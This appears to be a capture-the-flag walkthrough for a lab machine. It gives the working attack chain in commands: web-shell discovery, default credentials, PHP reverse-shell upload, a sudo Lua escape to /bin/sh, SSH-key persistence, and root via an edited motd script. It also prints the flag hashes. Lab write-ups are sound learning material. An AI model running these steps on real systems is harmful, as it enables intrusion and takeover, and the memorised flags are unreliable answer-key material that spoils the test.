@@ -1,0 +1,50 @@
+nmap -sC -sV -oN nmap 10.10.10.181 -v -A
+
+port 80 open = website
+
+hint in source code:
+<!--Some of the best web shells that you might need ;)-->
+https://github.com/TheBinitGhimire/Web-Shells
+
+search for one of the shells:
+/smevk.php -> works
+
+default creds admin:admin
+
+cp /usr/share/laudanum/php/php-reverse-shell.php . -> change ip:port
+upload reverse shell -> get a shell on host as webadmin
+
+start privilege escalation
+
+$ cat /home/webadmin/note.txt
+- sysadmin -
+I have left a tool to practice Lua.
+I'm sure you know where to find it.
+Contact me if you have any question.
+
+$ sudo -l
+User webadmin may run the following commands on traceback:
+    (sysadmin) NOPASSWD: /home/sysadmin/luvit
+
+sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("/bin/sh")'
+-> we are sysadmin
+
+user flag in /home/sysadmin
+b09d9243259a4192211fabae1647d210
+
+/bin/sh -i -> get a shell
+
+I can now modify /home/sysadmin/.ssh/authorized_keys with mine to log via ssh
+as sysadmin
+-> ssh -i ~/.ssh/id_rsa sysadmin@10.10.10.181
+
+after moving around I find this in /etc:
+drwxr-xr-x  2 root sysadmin  4096 Aug 27  2019 update-motd.d
+
+00-header is bash script which prints "Welcome to Xh4H land"
+-> what we have when logging via ssh
+
+echo "cat /root/root.txt" >> 00-header
+
+root flag when connecting again:
+344ce1463e61ac4da66248ee8557f901
